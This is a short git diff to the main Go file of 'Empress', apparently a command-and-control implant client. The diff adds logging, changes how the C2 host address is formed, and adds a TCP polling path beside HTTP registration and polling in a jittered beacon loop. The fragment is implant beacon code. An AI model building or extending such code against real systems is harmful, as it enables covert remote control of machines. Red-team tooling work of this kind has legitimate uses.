@@ -8,8 +8,8 @@ import (
 	"github.com/pygrum/Empress/config"
 	"github.com/pygrum/Empress/tasks"
 	"github.com/pygrum/Empress/transport"
+	log "github.com/sirupsen/logrus"
 	"math/rand"
-	"os"
 	"time"
 )
 
@@ -19,10 +19,10 @@ var (
 
 func main() {
 	if err := config.Initialize(); err != nil {
-		os.Exit(1)
+		log.Fatalf("failed to initialize config: %v", err)
 	}
 	if err := newClient(); err != nil {
-		os.Exit(1)
+		log.Fatalf("could not create new client: %v", err)
 	}
 	tickSalt := config.C.CallbackSalt
 	r := rand.New(rand.NewSource(time.Now().Unix()))
@@ -32,15 +32,13 @@ func main() {
 		// because the ticker ticks every interval-tickSalt seconds,
 		time.Sleep(time.Duration(r.Intn(int(tickSalt))) * time.Millisecond)
 		// first registration needs no data
-		if err := run(c2.Registration(nil)); err != nil {
-			continue
-		}
+		run(c2.Registration(nil))
 	}
 }
 
 func newClient() error {
 	var err error
-	addr := fmt.Sprintf("http://%s:%s", config.C.C2Host, config.C.C2Port)
+	addr := fmt.Sprintf("%s:%s", config.C.C2Host, config.C.C2Port)
 	client, err = c2.NewClient(addr)
 	if err != nil {
 		return err
@@ -52,11 +50,17 @@ func newClient() error {
 }
 
 func run(registration *transport.Registration) error {
-	// start by registering. if registration fails then we must die.
-	// this is because registration happens literally right
-	if err := client.Register(registration); err != nil {
-		return err
+	// start by registering
+	if !config.C.TCP {
+		if err := client.Register(registration); err != nil {
+			return err
+		}
+		reg, _ := client.Poll()
+		return run(reg)
+	} else {
+		if err := client.PollTCP(); err != nil {
+			return err
+		}
 	}
-	reg, _ := client.Poll()
-	return run(reg)
+	return nil
 }
